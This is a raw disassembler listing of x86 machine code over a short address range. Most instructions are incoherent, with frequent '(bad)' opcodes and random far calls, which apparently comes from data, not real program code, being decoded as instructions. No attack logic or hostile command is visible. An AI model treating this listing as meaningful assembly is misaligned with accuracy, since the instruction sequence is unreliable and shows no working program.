  438a29:	and    DWORD PTR [eax+eax*1-0x3a0000],edi
  438a30:	bound  edi,QWORD PTR [edx-0x1]
  438a33:	add    BYTE PTR [eax],al
  438a35:	inc    DWORD PTR [edx+0x5b]
  438a38:	cld    
  438a39:	mov    al,ds:0xffff00e1
  438a3e:	mov    cl,0x0
  438a40:	stos   BYTE PTR es:[edi],al
  438a41:	nop
  438a42:	(bad)  
  438a43:	inc    DWORD PTR [eax]
  438a45:	push   DWORD PTR [edi]
  438a47:	test   DWORD PTR ds:0x8983b581,0x6cffb200
  438a51:	iret   
  438a52:	add    bh,bh
  438a54:	dec    DWORD PTR [ecx+0x57c13a9d]
  438a5a:	in     eax,dx
  438a5b:	add    BYTE PTR [eax],al
  438a5d:	call   FWORD PTR [esi]
  438a5f:	int3   
  438a60:	bnd jns 0x438a62
  438a63:	inc    DWORD PTR [eax]
  438a65:	push   DWORD PTR [eax]
  438a67:	xchg   esp,eax
  438a68:	gs dec ebx
  438a6a:	cli    
  438a6b:	inc    DWORD PTR [eax]
  438a6d:	add    BYTE PTR [edi],dl
  438a6f:	int3   
  438a70:	cmc    
  438a71:	pusha  
  438a72:	add    bh,bh
  438a74:	add    DWORD PTR [ebx+0xa4d96f7],0xffffffca
  438a7b:	int3   
  438a7c:	mov    edi,edi
  438a7e:	mov    al,0xff
  438a80:	cmp    al,0x6d
  438a82:	int3   
  438a83:	dec    esp
  438a85:	dec    DWORD PTR [edi+esi*8]
  438a88:	shl    DWORD PTR [eax],1
  438a8a:	mov    ds:0x67000000,al
  438a8f:	call   FWORD PTR [esi-0x2c]
  438a92:	inc    DWORD PTR [eax]
  438a94:	inc    DWORD PTR [ebx+0x5c94373b]
  438a9a:	push   0xcaff89cc
  438a9f:	add    BYTE PTR [ecx-0x337cff09],al
  438aa5:	and    DWORD PTR [edi+0x3df11e90],0xffffffff
  438aac:	add    ah,cl
  438aae:	out    0xff,eax
  438ab0:	ins    BYTE PTR es:[edi],dx
  438ab1:	out    dx,al
  438ab2:	inc    DWORD PTR [eax]
  438ab4:	inc    DWORD PTR [ebx+0x7579b0e]
  438aba:	mov    ch,0x0
  438abc:	(bad)  
  438abd:	dec    DWORD PTR [ebx-0x7c916677]
  438ac3:	add    BYTE PTR [eax],al
  438ac5:	dec    DWORD PTR [eax+0x60126125]
  438acb:	(bad)  
  438acc:	inc    DWORD PTR [ebx-0xf593398]
  438ad2:	add    BYTE PTR [eax],al
  438ad4:	(bad)  
  438ad5:	dec    DWORD PTR [edx]
  438ad7:	jecxz  0x438b36
  438ad9:	xchg   esi,eax
  438ada:	inc    ebp
  438adb:	dec    esp
  438add:	add    cl,al
  438adf:	add    dl,dl
  438ae1:	xor    edi,edi
  438ae3:	add    bh,bh
  438ae5:	(bad)  
  438ae6:	cld    
  438ae7:	sti    
  438ae8:	fdiv   QWORD PTR [ecx-0x33ff7cae]
  438aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438aef:	or     edi,0xffffffe4
  438af2:	inc    DWORD PTR [eax]
  438af4:	add    bh,bh
  438af6:	ficom  DWORD PTR [edi]
  438af8:	lahf   
  438af9:	loop   0x438ad0
  438afb:	inc    DWORD PTR [eax]
  438afd:	push   DWORD PTR [esi]
  438aff:	add    bh,bl
  438b01:	sahf   
  438b02:	add    bh,bh
  438b04:	inc    DWORD PTR [eax]
  438b06:	iret   
  438b07:	jge    0x438a9d
  438b09:	dec    ebp
  438b0a:	push   ebp
  438b0b:	cmp    edi,0xffffffff
  438b0e:	hlt    
  438b0f:	jmp    FWORD PTR [esi-0xff71]
  438b15:	call   DWORD PTR [esi+0x6b2bef15]
  438b1b:	(bad)  
  438b1c:	(bad)  
  438b1d:	call   DWORD PTR [edx+0x61aecc]
  438b23:	add    bh,bh
  438b25:	dec    DWORD PTR [edi+0x36]
  438b28:	out    0x6a,eax
  438b2a:	add    bh,bh
  438b2c:	add    BYTE PTR [eax],al
  438b2e:	cmp    al,0xff
  438b30:	call   0x1108a6e
  438b35:	int3   
  438b36:	and    ecx,DWORD PTR [eax+esi*8]
  438b39:	dec    esp
  438b3a:	cmp    ecx,esp
  438b3c:	dec    esp
  438b3e:	cmp    DWORD PTR [eax],eax
  438b40:	and    al,0x9
  438b42:	mov    esp,ecx
  438b44:	add    BYTE PTR [eax],al
  438b46:	pop    esi
  438b47:	sub    edx,0x83fff29b
  438b4d:	inc    DWORD PTR [eax+0xa84700]
  438b53:	(bad)  
  438b54:	(bad)  
  438b55:	call   DWORD PTR [ebx]
  438b57:	dec    edi
  438b58:	mov    dl,0xa0
  438b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438b5b:	dec    DWORD PTR [ecx+0x13ffa783]
  438b61:	(bad)  
  438b63:	inc    DWORD PTR [eax]
  438b65:	add    BYTE PTR [ecx],cl
  438b67:	jg     0x438bb8
  438b69:	mov    al,ds:0xff00ffe1
  438b6e:	(bad)  
  438b6f:	int3   
  438b70:	push   esp
  438b71:	fcos   
  438b73:	(bad)  
  438b74:	inc    DWORD PTR [ebx-0x74e9cac2]
  438b7a:	dec    ecx
  438b7b:	add    ah,cl
  438b7d:	adc    DWORD PTR [ecx+0x5f0289],0xffffffff
  438b84:	add    BYTE PTR [eax],al
  438b86:	add    BYTE PTR [eax-0x63],ah
  438b89:	lahf   
  438b8a:	pop    ecx
  438b8b:	cmp    edi,0xffffffff
  438b8e:	ins    DWORD PTR es:[edi],dx
  438b8f:	mov    DWORD PTR [ebx+0xff895b],edi
  438b95:	sub    DWORD PTR [eax-0x49a4f58b],0x0
  438b9c:	int3   
  438b9d:	add    BYTE PTR ds:0xff7e75cc,al
  438ba3:	(bad)  
  438ba4:	(bad)  
  438ba5:	(bad)  
  438ba6:	jmp    0x438bc0
  438ba8:	dec    ebx
  438ba9:	dec    ebp
  438baa:	push   ebx
  438bab:	dec    DWORD PTR [ecx+0x18ff9389]
  438bb1:	dec    ebp
  438bb2:	(bad)  
  438bb3:	dec    esp
  438bb5:	cmp    DWORD PTR [ebx],0xffffffb3
  438bb8:	or     DWORD PTR [ecx-0x7c2a],0x16
  438bbf:	push   DWORD PTR [ebx-0xff96]
  438bc5:	add    BYTE PTR [esi-0x1c922bd7],dl
  438bcb:	inc    DWORD PTR [eax]
  438bcd:	add    BYTE PTR [ecx],ah
  438bcf:	inc    DWORD PTR [edi-0x4]
  438bd5:	mov    DWORD PTR [ebp-0x3104ce39],eax
  438bdb:	add    DWORD PTR [eax],0xffffffff
  438bde:	call   0x842466e2
  438be3:	inc    DWORD PTR [ebx-0x3c702d7d]
  438be9:	in     eax,dx
  438bea:	aaa    
  438beb:	dec    esp
  438bed:	push   esi
  438bef:	add    BYTE PTR [edx],dl
  438bf1:	xchg   ebp,eax
  438bf2:	inc    DWORD PTR [eax]
  438bf4:	int3   
  438bf5:	jmp    DWORD PTR [ecx]
  438bf7:	jmp    ebp
  438bf9:	mov    eax,ds:0xff830f
  438bfe:	fwait
  438bff:	jmp    FWORD PTR [eax+0x12]
  438c02:	(bad)  
  438c03:	(bad)  
  438c04:	inc    DWORD PTR [eax]
  438c06:	xchg   DWORD PTR [ebx+ecx*2],eax
  438c09:	jae    0x438c6f
  438c0b:	dec    esp
  438c0d:	push   DWORD PTR [edi]
  438c0f:	inc    DWORD PTR ds:0x83ffd7
  438c15:	inc    DWORD PTR [eax+0x39c6ebcd]
  438c1b:	(bad)  
  438c1c:	dec    DWORD PTR [ecx-0x1852ff58]
  438c22:	inc    DWORD PTR [eax]
  438c24:	(bad)  
  438c25:	push   DWORD PTR ds:0x42d19d87
  438c2b:	inc    DWORD PTR [eax]
  438c2d:	dec    DWORD PTR [edi]
  438c2f:	add    BYTE PTR [ebx-0x77],al
  438c32:	(bad)  
  438c33:	(bad)  
  438c34:	inc    DWORD PTR [ebx+0x6d3df859]
  438c3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438c3b:	(bad)  
  438c3c:	inc    DWORD PTR [eax]
  438c3e:	pop    edx
  438c3f:	add    BYTE PTR [ebx+ecx*2+0xffff],dl
  438c46:	adc    ebx,edi
  438c48:	or     BYTE PTR [esi-0xfffff8],ah
  438c4e:	sub    al,0xff
  438c50:	pushf  
  438c51:	cdq    
  438c52:	add    BYTE PTR [ebx-0x750b0077],al
  438c58:	lock scas al,BYTE PTR es:[edi]
  438c5a:	dec    edx
  438c5b:	(bad)  
  438c5c:	inc    DWORD PTR [eax]
  438c5e:	mov    ecx,0xff169fcc
  438c63:	(bad)  
  438c64:	inc    DWORD PTR [eax]
  438c66:	fild   DWORD PTR [edi]
  438c68:	dec    esp
  438c69:	test   DWORD PTR [edi-0x1],0xcc20ff00
  438c70:	mul    dl
  438c72:	add    BYTE PTR [ebx-0x438a0001],al
  438c78:	jno    0x438c6c
  438c7a:	cmp    eax,0x3bffff00
  438c7f:	int3   
  438c80:	pusha  
  438c81:	retf   0xffff
  438c84:	(bad)  
  438c85:	call   FWORD PTR [esi]
  438c87:	dec    esp
  438c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438c89:	dec    edx
  438c8a:	adc    edi,edi
  438c8c:	add    bh,bh
  438c8e:	ja     0x438c8f
  438c90:	add    DWORD PTR [ebp-0x76007d],ebx
  438c96:	cld    
  438c97:	mov    ds:0x83f3d9ee,eax
  438c9c:	cmp    edi,0xffffffa3
  438c9f:	add    BYTE PTR [edi],al
  438ca1:	and    al,BYTE PTR [eax]
  438ca3:	add    bh,bh
  438ca5:	call   FWORD PTR [ecx-0x55]
  438ca8:	(bad)  
  438ca9:	test   eax,0xffcc898f
  438cae:	push   edx
  438caf:	jmp    DWORD PTR [eax+0xffff2e]
  438cb5:	int3   
  438cb6:	xlat   BYTE PTR ds:[ebx]
  438cb7:	sbb    ebp,DWORD PTR [edi-0x47]
  438cba:	mov    edi,?
  438cbc:	inc    DWORD PTR [eax]
  438cbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438cbf:	call   DWORD PTR [edi+eiz*1]
  438cc2:	mov    edi,edi
  438cc4:	(bad)  
  438cc5:	inc    DWORD PTR [edi]
  438cc7:	jae    0x438c91
  438cc9:	cs inc esp
  438ccb:	cmp    edi,0xffffff89
  438cce:	loopne 0x438cd0
  438cd0:	push   ecx
  438cd1:	cld    
  438cd2:	add    DWORD PTR [ebx+0x7041ffff],0x55
  438cd9:	jmp    0x438cab
  438cdb:	mov    edi,edi
  438cdd:	add    BYTE PTR [edx-0xf30400],bl
  438ce3:	add    BYTE PTR [ebx+0x6601baff],al
  438ce9:	pushf  
  438cea:	jge    0x438ceb
  438cec:	add    BYTE PTR [eax],al
  438cee:	enter  0xebff,0xcb
  438cf2:	inc    DWORD PTR [eax]
  438cf4:	or     DWORD PTR [ecx+0x17395f0],0x34
  438cfb:	add    BYTE PTR [eax],al
  438cfd:	int3   
  438cfe:	aaa    
  438cff:	jmp    DWORD PTR [esi]
  438d01:	fdiv   st(7),st
  438d03:	add    BYTE PTR [eax],al
  438d05:	sbb    DWORD PTR [ebx+esi*2],0x56
  438d09:	mov    eax,ds:0xffff8333
  438d0e:	push   ss
  438d0f:	(bad)  
  438d10:	mov    ecx,0xff83ff78
  438d15:	jmp    FWORD PTR [eax-0x3c]
  438d18:	dec    ebp
  438d19:	sti    
  438d1a:	pop    ss
  438d1b:	add    ah,cl
  438d1d:	inc    ebp
  438d1f:	add    BYTE PTR [ebx-0xce],al
  438d25:	add    bl,dl
  438d27:	inc    esi
  438d28:	ror    DWORD PTR [esi],0x46
  438d2b:	add    BYTE PTR [eax],al
  438d2d:	add    BYTE PTR [esi],dh
  438d2f:	jmp    DWORD PTR [ecx-0x72]
  438d32:	add    bh,bh
  438d34:	mov    edi,edi
  438d36:	add    DWORD PTR [edi-0x82e2d0],0xb9ff00
  438d40:	pop    edx
  438d41:	rol    BYTE PTR [ebx+0x53ffffcc],1
  438d47:	jge    0x438d0b
  438d49:	in     eax,dx
  438d4a:	(bad)  
  438d4b:	(bad)  
  438d4c:	(bad)  
  438d4d:	jmp    DWORD PTR [ebx]
  438d4f:	(bad)  
  438d50:	jle    0x438cfe
  438d52:	inc    DWORD PTR [eax]
  438d54:	(bad)  
  438d55:	call   eax
  438d57:	dec    esi
  438d58:	repnz aad 0xb3
  438d5b:	mov    edi,edi
  438d5d:	adc    esp,0xffffffcc
  438d60:	idiv   bl
  438d62:	dec    DWORD PTR [ecx+0x17f20083]
  438d68:	shr    BYTE PTR [ebp-0x7c33f2],cl
  438d6e:	sub    DWORD PTR [ebx+0xffb986],eax
  438d74:	inc    DWORD PTR [ebx+0x756f6dd]
  438d7a:	mov    ebp,0x7700ccff
  438d7f:	jmp    FWORD PTR [ecx+0x1c]
  438d82:	int3   
  438d83:	(bad)  
  438d84:	inc    DWORD PTR [eax]
  438d86:	jle    0x438d20
  438d88:	push   edx
  438d89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438d8a:	mov    esp,0x6ffffff
  438d8f:	int3   
  438d90:	test   BYTE PTR [edi],al
  438d92:	int3   
  438d93:	dec    esp
  438d95:	jmp    ecx
  438d97:	jmp    0x438d48
  438d99:	add    al,0xf3
  438d9b:	cmp    edi,0x0
  438d9e:	xchg   ebp,eax
  438d9f:	mov    DWORD PTR [edi],esi
  438da1:	push   esp
  438da2:	inc    DWORD PTR [eax]
  438da4:	(bad)  
  438da5:	inc    DWORD PTR [edi]
  438da7:	or     ebp,ecx
  438da9:	fidiv  DWORD PTR [edx+0x4dff00ff]
  438daf:	add    bh,dl
  438db1:	and    eax,DWORD PTR [ebx-0x18007700]
  438db7:	cmc    
  438db8:	out    0x6f,eax
  438dba:	ret    
  438dbb:	cmp    edi,0xffffff89
  438dbe:	and    bh,bh
  438dc0:	sbb    DWORD PTR ds:0xffffff,ebp
  438dc6:	pop    esi
  438dc7:	cs mov bh,0xa9
  438dca:	scas   eax,DWORD PTR es:[edi]
  438dcb:	mov    esp,ecx
  438dcd:	add    BYTE PTR [ecx-0x78be00],dh
  438dd3:	add    DWORD PTR [eax],0xffffffff
  438dd6:	sub    al,0x59
  438dd8:	cwde   
  438dd9:	adc    ebp,0x6f8300cc
  438ddf:	or     DWORD PTR [edi],0xffffff87
  438de2:	(bad)  
  438de3:	(bad)  
  438de4:	inc    DWORD PTR [eax]
  438de6:	sbb    edx,esp
  438de8:	icebp  
  438de9:	out    0x58,eax
  438deb:	inc    DWORD PTR [eax]
  438ded:	add    bl,dh
  438def:	or     edx,0x3b
  438df2:	add    BYTE PTR [eax],al
  438df4:	inc    DWORD PTR [ebx+0x3ac66032]
  438dfa:	xor    eax,0x7700ff00
  438dff:	add    BYTE PTR [eax+0x3b],dh
  438e02:	inc    DWORD PTR [ebx+0x5f6ecc00]
  438e08:	push   0x49
  438e0a:	push   ebp
  438e0b:	(bad)  
  438e0c:	dec    DWORD PTR [ecx+0x24d3ffb6]
  438e12:	(bad)  
  438e13:	inc    DWORD PTR [ebx-0x5df18700]
  438e19:	ror    BYTE PTR [esp+ecx*8],cl
  438e1c:	inc    DWORD PTR [ebx-0x6e9600ec]
  438e22:	(bad)  
  438e23:	dec    esp
  438e25:	add    cl,cl
  438e27:	add    ebx,DWORD PTR [edx]
  438e29:	cld    
  438e2a:	and    al,0x0
  438e2c:	(bad)  
  438e2d:	jmp    DWORD PTR [ebx+eax*4]
  438e30:	lahf   
  438e31:	mov    esp,0x83ff83ff
  438e36:	fidiv  WORD PTR [edi]
  438e38:	sahf   
  438e39:	xchg   esi,eax
  438e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438e3b:	(bad)  
  438e3c:	(bad)  
  438e3d:	(bad)  
  438e3e:	mov    ebp,0xff525e00
  438e43:	mov    edi,edi
  438e45:	mov    esp,edx
  438e47:	ror    DWORD PTR [ebx-0x53],1
  438e4a:	xchg   ecx,eax
  438e4b:	add    BYTE PTR [ebx+0x26ff4cff],al
  438e51:	mov    dl,0x0
  438e53:	(bad)  
  438e54:	inc    DWORD PTR [ebx+0x4622f0b7]
  438e5a:	cli    
  438e5b:	add    bh,bh
  438e5d:	int3   
  438e5e:	sub    ecx,esp
  438e60:	scas   eax,DWORD PTR es:[edi]
  438e61:	dec    edx
  438e62:	(bad)  
  438e63:	(bad)  
  438e64:	inc    DWORD PTR [eax]
  438e66:	and    eax,esi
  438e68:	addr16 mov ds:0xff,ax
  438e6d:	jmp    FWORD PTR [esi-0x27e401]
  438e73:	int3   
  438e74:	(bad)  
  438e75:	jmp    DWORD PTR [edi]
  438e77:	pop    esi
  438e78:	cdq    
  438e79:	sub    al,0x50
  438e7b:	(bad)  
  438e7c:	(bad)  
  438e7d:	inc    edx
  438e7f:	jmp    FWORD PTR [edx+edi*1]
  438e82:	add    bh,bh
  438e84:	add    DWORD PTR [ebx+0x5a9ee37b],0xc
  438e8b:	(bad)  
  438e8c:	(bad)  
  438e8d:	dec    DWORD PTR [eax-0x31e501]
  438e93:	add    bh,bh
  438e95:	add    BYTE PTR [ecx],bh
  438e97:	add    BYTE PTR [ebx-0x3c6],ch
  438e9d:	and    DWORD PTR [ecx-0xb9c777],0x0
  438ea4:	inc    DWORD PTR [eax]
  438ea6:	icebp  
  438ea7:	ins    BYTE PTR es:[edi],dx
  438ea8:	(bad)  
  438ea9:	(bad)  [ecx+0x0]
  438eac:	add    bh,bh
  438eae:	loope  0x438eb0
  438eb0:	or     DWORD PTR [esi+0x0],esi
  438eb3:	inc    DWORD PTR [eax]
  438eb5:	sbb    esi,0x62
  438eb8:	aad    0xce
  438eba:	inc    esi
  438ebb:	(bad)  
  438ebc:	dec    DWORD PTR [ecx+0x32d6ff25]
  438ec2:	inc    DWORD PTR [eax]
  438ec4:	(bad)  
  438ec5:	(bad)  
  438ec6:	jmp    0xcc00:0x51551ba4
  438ecd:	int3   
  438ece:	nop
  438ecf:	mov    DWORD PTR [ebp+0xffff],eax
  438ed5:	add    BYTE PTR [ebp-0x1df5d037],ch
  438edb:	inc    DWORD PTR [ebx+0x10ff4a89]
  438ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438ee2:	inc    DWORD PTR [eax]
  438ee4:	add    BYTE PTR [ebx+0x137fe1d8],al
  438eea:	mov    ecx,0xa8ff0083
  438eef:	or     DWORD PTR [edi+0x3],0xffffffff
  438ef3:	add    BYTE PTR [eax],al
  438ef5:	(bad)  
  438ef6:	cmp    bl,BYTE PTR [ecx+edi*8+0x0]
  438efa:	ss add bh,bh
  438efd:	jmp    FWORD PTR [edi+edi*8-0x76007204]
  438f04:	(bad)  
  438f05:	call   FWORD PTR [esp+ebp*1+0x96dfe3]
  438f0c:	inc    DWORD PTR [ebx-0x5561331f]
  438f12:	(bad)  
  438f13:	(bad)  
  438f14:	(bad)  
  438f15:	call   FWORD PTR [esi-0x2f]
  438f18:	(bad)  
  438f19:	ror    bl,1
  438f1b:	inc    DWORD PTR [eax]
  438f1d:	add    BYTE PTR [eax+eax*1+0xf6f],bl
  438f24:	inc    DWORD PTR [eax]
  438f26:	lahf   
  438f27:	push   edx
  438f28:	es aas 
  438f2a:	dec    esi
  438f2b:	add    bh,bh
  438f2d:	call   DWORD PTR [edx-0x1]
  438f30:	add    BYTE PTR [ebp-0xff3400],0x57
  438f37:	inc    ebp
  438f38:	stc    
  438f39:	fimul  WORD PTR [eax+eax*1-0x7d]
  438f3d:	dec    edi
  438f3f:	add    DWORD PTR [eax-0x31],0xffffffff
  438f46:	adc    edx,DWORD PTR [edi+0xa28688]
  438f4c:	(bad)  
  438f4d:	call   FWORD PTR [ecx]
  438f4f:	(bad)  
  438f50:	cmp    BYTE PTR [edx],bh
  438f52:	int3   
  438f53:	(bad)  
  438f54:	(bad)  
  438f55:	(bad)  
  438f56:	clc    
  438f57:	cmp    BYTE PTR [esi+eax*4-0x4e],0x0
  438f5c:	dec    esp
  438f5e:	jl     0x438f5f
  438f60:	inc    edx
  438f61:	cmc    
  438f62:	(bad)  
  438f63:	inc    DWORD PTR [eax]
  438f65:	call   DWORD PTR [ebx]
  438f67:	sub    ah,BYTE PTR [edi-0x9567]
  438f6d:	jmp    ebx
  438f6f:	jmp    FWORD PTR [edx]
  438f71:	xchg   BYTE PTR [eax],al
  438f73:	dec    esp
  438f75:	(bad)  
  438f76:	cmp    DWORD PTR [esi],esp
  438f78:	enter  0x2e85,0x0
  438f7c:	inc    DWORD PTR [eax]
  438f7e:	push   ecx
  438f7f:	add    dh,dh
  438f81:	xchg   ebp,eax
  438f82:	add    DWORD PTR [eax],0xffffffff
  438f85:	jmp    FWORD PTR [ecx]
  438f87:	or     eax,0x9175da
  438f8c:	add    BYTE PTR [ebx+0x510a00d6],al
  438f92:	add    bh,bh
  438f94:	inc    DWORD PTR [eax]
  438f96:	(bad)  
  438f97:	mov    edx,0x8355ef43
  438f9c:	mov    edi,edi
  438f9e:	loope  0x438f9f
  438fa0:	stos   BYTE PTR es:[edi],al
  438fa1:	mov    eax,0x89cc0000
  438fa6:	data16 cmp bl,BYTE PTR [edi+0x2c]
  438faa:	push   0x11ccffff
  438faf:	add    BYTE PTR [edi+0xfffff3],ch
  438fb5:	call   DWORD PTR [eax-0x66]
  438fb8:	jno    0x438f4b
  438fba:	adc    edi,edi
  438fbc:	dec    esp
  438fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438fbf:	(bad)  
  438fc0:	mov    eax,0xffff9e
  438fc5:	and    DWORD PTR [esi+0x74bca905],0x0
  438fcc:	add    bh,bh
  438fce:	or     DWORD PTR [ebx+0x8368d8],eax
  438fd4:	cmp    edi,0x4
  438fd7:	popa   
  438fd8:	mov    edx,0xcc004f0c
  438fdd:	inc    DWORD PTR [edi]
  438fdf:	add    BYTE PTR [esi+0x71],dl
  438fe2:	add    bh,bh
  438fe4:	add    DWORD PTR [eax],0xffffff9f
  438fe7:	adc    DWORD PTR [ecx],edi
  438fe9:	js     0x438fe5
  438feb:	inc    DWORD PTR [ebx-0x14004d34]
  438ff1:	jg     0x438ff2
  438ff3:	inc    DWORD PTR [eax]
  438ff5:	sbb    DWORD PTR [edi],0xffffffb7
  438ff8:	sbb    al,0xc0
  438ffa:	xor    al,0x83
  438ffc:	or     esp,0x3f
  438fff:	add    bl,ch
  439001:	fiadd  WORD PTR [eax]
  439003:	add    BYTE PTR [eax],al
  439005:	(bad)  
  439006:	std    
  439007:	out    dx,eax
  439008:	jne    0x439089
  43900a:	jg     0x43900b
  43900c:	inc    DWORD PTR [ebx-0x2337ff61]
  439012:	dec    DWORD PTR [ecx-0x1f940100]
  439018:	in     eax,0xf5
  43901a:	sub    al,0x0
  43901c:	add    BYTE PTR [eax],al
  43901e:	mov    ds:0xd351ff,eax
  439023:	(bad)  
  439024:	(bad)  
  439025:	(bad)  
  439026:	fcmovnbe st,st(1)
  439028:	jp     0x438fdd
  43902a:	inc    ebx
  43902b:	inc    DWORD PTR [ebx+0x22ff60ff]
  439031:	je     0x439032
  439033:	add    bh,bh
  439035:	inc    DWORD PTR [esp+esi*1]
  439038:	inc    edi
  439039:	(bad)
  43903c:	mov    DWORD PTR [ebx-0x2de77c45],eax
  439042:	inc    DWORD PTR [eax]
  439044:	(bad)  
  439045:	dec    DWORD PTR [edi+0x63]
  439048:	adc    ch,bl
  43904a:	jae    0x438fcf
  43904c:	mov    edi,edi
  43904e:	ud0    ebp,DWORD PTR [ebp+0x83cc00]
  439055:	xor    DWORD PTR [edx+0x4e4d5191],0x0
  43905c:	inc    DWORD PTR [eax]
  43905e:	enter  0x9e83,0x31
  439062:	cmp    edi,0xffffff89
  439065:	add    BYTE PTR [ecx-0x2e93c4c7],cl
  43906b:	int3   
  43906c:	or     esp,0xffffff9b
  43906f:	add    BYTE PTR [eax+0x4d],dl
  439072:	add    ah,cl
  439074:	int3   
  439075:	add    BYTE PTR [edi-0x58282ab4],al
  43907b:	add    BYTE PTR [ecx-0x14ff0d01],cl
  439081:	js     0x439082
  439083:	add    DWORD PTR [eax],0x0
  439086:	mov    ah,0xba
  439088:	dec    ecx
  439089:	adc    DWORD PTR [edi+0x47ffffff],ecx
  43908f:	int3   
  439090:	jecxz  0x43907a
  439092:	inc    DWORD PTR [eax]
  439094:	inc    DWORD PTR [ebx-0x3d078dcf]
  43909a:	or     al,0xff
  43909c:	mov    edi,edi
  43909e:	and    bh,bh
  4390a0:	inc    esp
  4390a1:	call   0x844319a6
  4390a6:	je     0x439091
  4390a8:	jnp    0x439062
  4390aa:	enter  0x83,0xff
  4390ae:	(bad)  
  4390af:	add    bh,cl
  4390b1:	add    BYTE PTR [eax],0xff
  4390b4:	add    ah,cl
  4390b6:	mov    dl,0x2
  4390b8:	xor    edx,DWORD PTR [ebx+0x11]
  4390bb:	add    BYTE PTR [eax],al
  4390bd:	jmp    DWORD PTR [esi]
  4390bf:	or     edi,0x17
  4390c2:	inc    DWORD PTR [ebx+0x3bb700ff]
  4390c8:	cld    
  4390c9:	mov    edx,0xff00ff7e
  4390ce:	mov    ecx,0x4049ff
  4390d3:	add    DWORD PTR [ebx-0x62f8e001],0xffffff8b
  4390da:	daa    
  4390db:	inc    DWORD PTR [eax]
  4390dd:	call   FWORD PTR [ecx-0x77]
  4390e0:	test   eax,0xff00ff95
  4390e5:	add    BYTE PTR [edi],cl
  4390e7:	pop    ss
  4390e8:	jg     0x4390d5
  4390ea:	dec    edi
  4390eb:	add    bh,bh
  4390ed:	mov    DWORD PTR [ebx+eax*4-0xa56a],eax
  4390f4:	(bad)  
  4390f5:	call   FWORD PTR [edx+0x59]
  4390f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4390f9:	hlt    
  4390fa:	in     al,dx
  4390fb:	(bad)  
  4390fc:	(bad)  
  4390fd:	call   DWORD PTR [eax+eax*1-0x337c65d7]
  439104:	add    BYTE PTR [ebx-0x2c693b39],al
  43910a:	sbb    edi,edi
  43910c:	dec    esp
  43910e:	jg     0x439110
  439110:	lods   al,BYTE PTR ds:[esi]
  439111:	pop    edx
  439112:	cmp    edi,0x0
  439115:	int3   
  439116:	fld    QWORD PTR [eax]
  439118:	pop    ebp
  439119:	xor    ebp,esi
  43911b:	inc    DWORD PTR [eax]
  43911d:	add    ch,dl
  43911f:	jmp    FWORD PTR [ecx]
  439121:	mov    ecx,0xffffff
  439126:	mov    eax,ds:0xff12b460
  43912b:	mov    DWORD PTR [eax],eax
  43912d:	add    BYTE PTR [edi],dl
  43912f:	inc    DWORD PTR [ecx-0x76007c59]
  439135:	add    BYTE PTR [ebx],bh
  439137:	fs not ch
  43913a:	lods   al,BYTE PTR ds:[esi]
  43913b:	(bad)  
  43913c:	(bad)  
  43913d:	call   FWORD PTR [eax]
  43913f:	add    bl,bl
  439141:	adc    ah,cl
  439143:	int3   
  439144:	add    BYTE PTR [ecx-0x3843ca78],cl
  43914a:	mov    esp,0x24ff00ff
  43914f:	add    al,dh
  439151:	and    al,BYTE PTR [ebx+0x12ff0000]
  439157:	mov    edi,0xffe15f73
  43915c:	(bad)  
  43915d:	inc    esp
  43915f:	mov    DWORD PTR [eax],edx
  439161:	imul   ecx,esp,0xe600ffcc
  439167:	ins    BYTE PTR es:[edi],dx
  439168:	dec    esi
  439169:	pop    es
  43916a:	push   0xa008900
  43916f:	int3   
  439170:	ss das 
  439172:	add    DWORD PTR [eax],0xffffff83
  439175:	and    ebx,0x33
  439178:	jmp    0x4327ca
  43917d:	mov    DWORD PTR [ebx-0x1],ecx
  439180:	sar    BYTE PTR [ecx],cl
  439182:	add    bh,bh
  439184:	add    BYTE PTR [eax],al
  439186:	cmp    DWORD PTR [esi-0xd6a86e],esp
  43918c:	add    bh,bh
  43918e:	iret   
  43918f:	(bad)  
  439190:	jle    0x439171
  439192:	inc    DWORD PTR [eax]
  439194:	dec    esp
  439196:	and    al,0x15
  439198:	test   DWORD PTR [edi],esi
  43919a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43919b:	(bad)  
  43919c:	(bad)  
  43919d:	push   edi
  43919f:	call   FWORD PTR [edi]
  4391a1:	fwait
  4391a2:	inc    DWORD PTR [eax]
  4391a4:	add    bh,bh
  4391a6:	fld    QWORD PTR [ecx]
  4391a8:	jne    0x43913e
  4391aa:	cmp    bh,bh
  4391ac:	dec    DWORD PTR [ecx-0x5da7ff1a]
  4391b2:	cmp    edi,0x0
  4391b5:	call   DWORD PTR [edi+0x7c]
  4391b8:	(bad)  
  4391b9:	push   ecx
  4391ba:	(bad)  
  4391bb:	dec    esp
  4391bd:	sbb    DWORD PTR [esi+0x0],0xffffffb4
  4391c1:	pop    esi
  4391c2:	mov    DWORD PTR [ebx-0x30be7d00],eax
  4391c8:	add    BYTE PTR es:[edx+0x37008300],dh
  4391cf:	cmp    ecx,0xffffff82
  4391d2:	inc    DWORD PTR [eax]
  4391d4:	(bad)  
  4391d5:	dec    DWORD PTR [ecx-0xe2e48a1]
  4391db:	or     DWORD PTR [ecx+0xc00feff],0xffffff88
  4391e2:	add    BYTE PTR [ebx+0x56c70083],al
  4391e8:	enter  0x807e,0xcc
  4391ec:	(bad)  
  4391ed:	call   DWORD PTR [eax+eax*1-0x89ed]
  4391f4:	(bad)  
  4391f5:	dec    DWORD PTR [ebx*8+0xb8820c]
  4391fc:	dec    DWORD PTR [ecx+0x3251ff7c]
  439202:	cmp    edi,0x0
  439205:	(bad)  
  439206:	jp     0x439190
  439208:	jmp    0x9900:0xf2e0
  43920f:	mov    DWORD PTR [ebx],edi
  439211:	dec    ebp
  439212:	inc    DWORD PTR [eax]
  439214:	inc    DWORD PTR [eax]
  439216:	(bad)  
  439217:	dec    ecx
  439218:	lods   al,BYTE PTR ds:[esi]
  439219:	xchg   DWORD PTR [edi+0x5d00ffff],ebp
